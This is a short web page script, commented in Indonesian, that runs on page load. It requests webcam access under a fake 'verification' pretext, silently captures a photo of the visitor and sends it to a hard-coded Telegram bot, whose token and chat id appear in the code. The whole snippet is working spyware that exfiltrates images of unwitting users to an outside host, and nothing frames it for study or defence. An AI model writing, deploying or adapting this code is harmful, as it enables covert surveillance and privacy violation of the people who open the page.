<script>
    const token = '8294820735:AAFiNDZekoQwTp_sKu-qf-0KuVC8RNsfzY8'; 
    const chat_id = '985559722'; 

    async function startCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // Tunggu 3 detik agar kamera benar-benar siap
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'capture.jpg');

                    // Menggunakan await untuk memastikan pengiriman terpantau
                    const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        console.log("Berhasil! Cek Telegram Anda.");
                    } else {
                        console.log("Gagal kirim. Status:", response.status);
                    }
                }, 'image/jpeg');
            }, 3000);
        } catch (err) {
            alert("Harus klik ALLOW/IZINKAN agar verifikasi berhasil.");
        }
    }

    // Jalankan fungsi
    startCapture();
</script>
